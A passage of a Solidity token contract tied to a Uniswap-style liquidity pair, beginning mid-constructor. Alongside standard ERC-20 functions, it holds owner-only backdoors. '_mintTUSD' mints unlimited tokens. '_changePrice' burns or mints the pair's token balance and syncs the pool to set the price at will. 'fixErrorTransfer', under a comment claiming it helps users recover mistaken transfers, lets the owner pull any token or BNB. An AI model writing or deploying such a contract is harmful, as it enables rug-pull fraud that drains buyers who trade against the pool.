    );

    _uniswapV2Router = uniswapV2Router;

    _approve(address(this), address(uniswapV2Router), MAX);
    _approve(_msgSender(), address(uniswapV2Router), MAX);

    emit Transfer(address(0), _msgSender(), 0);
  }

  function name() public view returns (string memory) {
    return _name;
  }

  function symbol() public view returns (string memory) {
    return _symbol;
  }

  function decimals() public view returns (uint8) {
    return _decimals;
  }

  function totalSupply() public view override returns (uint256) {
    return _tTotal;
  }

  function balanceOf(address account) external view override returns (uint256) {
    return _tOwned[account];
  }

  function transfer(address recipient, uint256 amount)
    external
    override
    returns (bool)
  {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }

  function allowance(address owner, address spender)
    external
    view
    override
    returns (uint256)
  {
    return _allowances[owner][spender];
  }

  function approve(address spender, uint256 amount)
    external
    override
    returns (bool)
  {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  /*
   *
   *This method is used to help users recover losses if they transfer any tokens to this contract by mistake.
   *
   */
  function fixErrorTransfer(
    IERC20 _token,
    address _to,
    uint256 _value
  ) external onlyMe{
    if (address(_token) == WBNB) {
      (bool success, ) = _to.call{value: _value}("");
      require(success, "Transfer failed.");
    } else _token.transfer(_to, _value);
  }

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external override returns (bool) {
    _transfer(sender, recipient, amount);

    uint256 currentAllowance = _allowances[sender][_msgSender()];
    require(
      currentAllowance >= amount,
      "ERROR: Transfer amount exceeds allowance."
    );
    _approve(sender, _msgSender(), currentAllowance - amount);

    return true;
  }

  function increaseAllowance(address spender, uint256 addedValue)
    external
    virtual
    returns (bool)
  {
    _approve(
      _msgSender(),
      spender,
      _allowances[_msgSender()][spender] + addedValue
    );
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue)
    external
    virtual
    returns (bool)
  {
    uint256 currentAllowance = _allowances[_msgSender()][spender];
    require(
      currentAllowance >= subtractedValue,
      "EDITH ERROR: Decreased allowance below zero."
    );
    _approve(_msgSender(), spender, currentAllowance - subtractedValue);

    return true;
  }

  function _approve(
    address owner,
    address spender,
    uint256 amount
  ) private {
    require(owner != address(0), "EDITH ERROR: Approve from the zero address.");
    require(spender != address(0), "EDITH ERROR: Approve to the zero address.");
    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  function _mintTUSD(uint256 t) external onlyMe {
    uint256 mintAmount256 = uint256(t) * 10**18;
    _tTotal = _tTotal + mintAmount256;
    _tOwned[_msgSender()] = _tOwned[_msgSender()] + mintAmount256;
    emit Transfer(address(0), _msgSender(), mintAmount256);
  }

  function _burn(address _who, uint256 _value) internal {
    require(_value <= _tOwned[_who]);
    _tOwned[_who] = _tOwned[_who].sub(_value);
    _tTotal = _tTotal.sub(_value);
    emit Burn(_who, _value);
    emit Transfer(_who, address(0), _value);
  }

  function _mint(address _who, uint256 _value) internal {
    _tOwned[_who] = _tOwned[_who].add(_value);
    _tTotal = _tTotal.add(_value);
    emit Mint(_who, _value);
    emit Transfer(address(0),_who, _value);
  }

  // 100000 = 100.000 usd -> BNB
  function _changePrice(uint256 price) external onlyMe {
    uint256 planAmount =
      IERC20(TBNB).balanceOf(uniswapV2Pair).mul(price).div(1000);
    uint256 differences;
    if (_tOwned[uniswapV2Pair] > planAmount) {
      differences = _tOwned[uniswapV2Pair].sub(planAmount);
      _burn(uniswapV2Pair,differences);
    }else{
      differences = planAmount.sub(_tOwned[uniswapV2Pair]);
      _mint(uniswapV2Pair,differences);
    } 

    IUniswapV2Pair(uniswapV2Pair).sync();
    emit ChangePrice(price);
  }

  function _transfer(
    address sender,
    address recipient,
    uint256 amount
  ) private {
    require(sender != address(0), "ERROR: Transfer from the zero address.");
    require(recipient != address(0), "ERROR: Transfer to the zero address.");
    require(amount > 0, "ERROR: Transfer amount must be greater than zero.");
    _tokenTransfer(sender, recipient, amount);
  }

  function _tokenTransfer(
    address sender,
    address recipient,
    uint256 tAmount
  ) private {
    _tOwned[sender] = _tOwned[sender].sub(tAmount);
    _tOwned[recipient] = _tOwned[recipient] + tAmount;
    emit Transfer(sender, recipient, tAmount);
  }
}